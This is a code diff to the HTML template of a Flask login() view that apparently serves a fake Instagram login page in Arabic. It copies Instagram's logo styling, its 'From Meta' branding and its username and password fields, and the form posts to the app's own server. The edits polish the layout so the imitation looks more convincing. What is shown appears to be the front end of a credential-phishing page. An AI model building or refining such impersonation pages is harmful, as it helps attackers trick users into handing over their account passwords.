@@ -56,86 +56,78 @@ def login():
     <title>تسجيل الدخول • Instagram</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
-        body { background: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; width: 100vw; }
+        body { background: #fff; width: 100vw; height: 100vh; display: flex; flex-direction: column; justify-content: space-between; align-items: center; }
         
-        .login-container { width: 100%; height: 100vh; max-width: none; padding: 20px; display: flex; flex-direction: column; justify-content: space-between; align-items: center; background: #fff; }
-        
-        .content-wrapper { width: 100%; max-width: 350px; margin: auto; text-align: center; }
+        .main-container { width: 100%; max-width: 350px; padding: 20px; display: flex; flex-direction: column; justify-content: center; flex-grow: 1; text-align: center; }
 
-        .insta-card { background: #fff; border: none; padding: 20px 0; text-align: center; margin-bottom: 10px; }
+        .insta-logo { font-family: 'Billabong', cursive, sans-serif; font-size: 50px; margin-bottom: 25px; color: #262626; font-weight: normal; letter-spacing: 1px; }
 
-        .insta-logo { font-family: 'Billabong', cursive, sans-serif; font-size: 48px; margin-bottom: 30px; color: #262626; font-weight: normal; letter-spacing: 1px; }
-
-        .error-msg { color: #ed4956; font-size: 14px; line-height: 18px; margin-bottom: 15px; text-align: center; font-weight: 500; background: #fce8e6; padding: 10px; border-radius: 4px; border: 1px solid #fad2cf; }
+        .error-msg { color: #ed4956; font-size: 13px; line-height: 16px; margin-bottom: 15px; text-align: center; font-weight: 500; background: #fce8e6; padding: 10px; border-radius: 4px; border: 1px solid #fad2cf; }
 
         .input-group { margin-bottom: 8px; }
         .input-group input { width: 100%; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 5px; padding: 12px; font-size: 14px; color: #262626; outline: none; }
         .input-group input:focus { border-color: #a8a8a8; }
 
-        .submit-btn { width: 100%; background: #0095f6; color: white; border: none; border-radius: 8px; padding: 12px; font-size: 14px; font-weight: 600; cursor: pointer; margin-top: 12px; margin-bottom: 20px; }
+        .submit-btn { width: 100%; background: #0095f6; color: white; border: none; border-radius: 8px; padding: 12px; font-size: 14px; font-weight: 600; cursor: pointer; margin-top: 10px; margin-bottom: 15px; }
         .submit-btn:hover { background: #1877f2; }
 
-        .divider { display: flex; align-items: center; margin: 15px 0 20px 0; }
+        .divider { display: flex; align-items: center; margin: 10px 0 15px 0; }
         .divider-line { flex-grow: 1; height: 1px; background: #dbdbdb; }
-        .divider-text { color: #8e8e8e; font-size: 13px; font-weight: 600; margin: 0 18px; text-transform: uppercase; }
+        .divider-text { color: #8e8e8e; font-size: 13px; font-weight: 600; margin: 0 15px; text-transform: uppercase; }
 
-        .forgot-pass { color: #00376b; font-size: 13px; text-decoration: none; display: block; margin-top: 15px; font-weight: 500; }
+        .forgot-pass { color: #00376b; font-size: 13px; text-decoration: none; display: block; margin-top: 10px; font-weight: 500; }
 
-        .signup-card { padding: 15px; text-align: center; font-size: 14px; color: #262626; border-top: 1px solid #dbdbdb; width: 100%; }
-        .signup-card a { color: #0095f6; font-weight: 600; text-decoration: none; }
-
-        /* تصميم شعار Meta الملون الواقعي */
-        .meta-footer { text-align: center; padding-bottom: 15px; width: 100%; }
-        .meta-logo { font-size: 15px; font-weight: 600; letter-spacing: 0.5px; display: inline-flex; align-items: center; gap: 5px; }
+        /* تذييل الصفحة (Meta والشعار السفلي) */
+        .footer-section { width: 100%; padding-bottom: 20px; text-align: center; }
+        
+        .meta-footer { margin-bottom: 12px; }
+        .meta-logo { font-size: 15px; font-weight: 600; letter-spacing: 0.5px; display: inline-flex; align-items: center; gap: 4px; }
         .meta-logo span:nth-child(1) { color: #0081FB; }
         .meta-logo span:nth-child(2) { color: #0092FA; }
         .meta-logo span:nth-child(3) { color: #00A3F6; }
         .meta-logo span:nth-child(4) { color: #00B4F0; }
         .meta-logo span:nth-child(5) { color: #00C5EA; }
+
+        .signup-card { padding: 12px; font-size: 14px; color: #262626; border-top: 1px solid #dbdbdb; width: 100%; }
+        .signup-card a { color: #0095f6; font-weight: 600; text-decoration: none; }
     </style>
 </head>
 <body>
-    <div class="login-container">
-        <div></div> <!-- فراغ علوي لضبط التوسيط -->
+    <div class="main-container">
+        <h1 class="insta-logo">Instagram</h1>
         
-        <div class="content-wrapper">
-            <div class="insta-card">
-                <h1 class="insta-logo">Instagram</h1>
-                
-                {% if error %}
-                    <div class="error-msg">{{ error }}</div>
-                {% endif %}
+        {% if error %}
+            <div class="error-msg">{{ error }}</div>
+        {% endif %}
 
-                <form method="POST">
-                    <div class="input-group">
-                        <input type="text" name="username" required placeholder="رقم الهاتف، اسم المستخدم أو البريد الإلكتروني" value="{{ username_val }}">
-                    </div>
-                    <div class="input-group">
-                        <input type="password" name="password" required placeholder="كلمة المرور">
-                    </div>
-                    <button type="submit" class="submit-btn">تسجيل الدخول</button>
-                </form>
-
-                <div class="divider">
-                    <div class="divider-line"></div>
-                    <div class="divider-text">أو</div>
-                    <div class="divider-line"></div>
-                </div>
-
-                <a href="#" class="forgot-pass">هل نسيت كلمة المرور؟</a>
+        <form method="POST">
+            <div class="input-group">
+                <input type="text" name="username" required placeholder="رقم الهاتف، اسم المستخدم أو البريد الإلكتروني" value="{{ username_val }}">
             </div>
+            <div class="input-group">
+                <input type="password" name="password" required placeholder="كلمة المرور">
+            </div>
+            <button type="submit" class="submit-btn">تسجيل الدخول</button>
+        </form>
+
+        <div class="divider">
+            <div class="divider-line"></div>
+            <div class="divider-text">أو</div>
+            <div class="divider-line"></div>
         </div>
 
-        <div style="width: 100%;">
-            <div class="meta-footer">
-                <div class="meta-logo">
-                    From 
-                    <span>M</span><span>e</span><span>t</span><span>a</span>
-                </div>
+        <a href="#" class="forgot-pass">هل نسيت كلمة المرور؟</a>
+    </div>
+
+    <div class="footer-section">
+        <div class="meta-footer">
+            <div class="meta-logo">
+                From 
+                <span>M</span><span>e</span><span>t</span><span>a</span>
             </div>
-            <div class="signup-card">
-                ليس لديك حساب؟ <a href="#">إشترك</a>
-            </div>
+        </div>
+        <div class="signup-card">
+            ليس لديك حساب؟ <a href="#">إشترك</a>
         </div>
     </div>
 </body>
